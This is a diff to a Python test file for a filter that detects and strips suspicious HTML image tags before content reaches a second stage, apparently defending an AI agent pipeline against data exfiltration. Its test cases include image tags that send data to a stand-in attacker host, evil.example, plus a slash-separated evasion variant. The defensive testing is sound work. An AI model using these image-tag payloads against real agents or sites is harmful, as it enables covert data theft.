@@ -147,7 +147,18 @@ def test_one_enormous_word_stays_cheap() -> None:
         ('<img src="https://evil.example/c?data=1"', 0),  # unclosed: never renders
         ('<img alt="no source">', 0),
         ('<img src="/static/logo.png">', 0),
+        ('<img data-src="https://cdn.example.com/a.png?data=1" src="/ph.png">', 0),
+        ('<img/src="https://evil.example/c?data=1">', 1),  # slash-separated
     ],
 )
 def test_html_image_shapes(markup: str, expected: int) -> None:
-    assert run_l1(markup).stats.exfiltration.exfiltration_urls == expected
+    """Counted, removed from L2's copy when suspicious, left alone otherwise, and
+    never touched in what the agent receives."""
+    result = run_l1(markup)
+    assert result.stats.exfiltration.exfiltration_urls == expected
+    assert result.content == markup
+    if expected:
+        assert "evil.example" not in result.l2_input
+        assert "[image removed]" in result.l2_input
+    else:
+        assert result.l2_input == markup
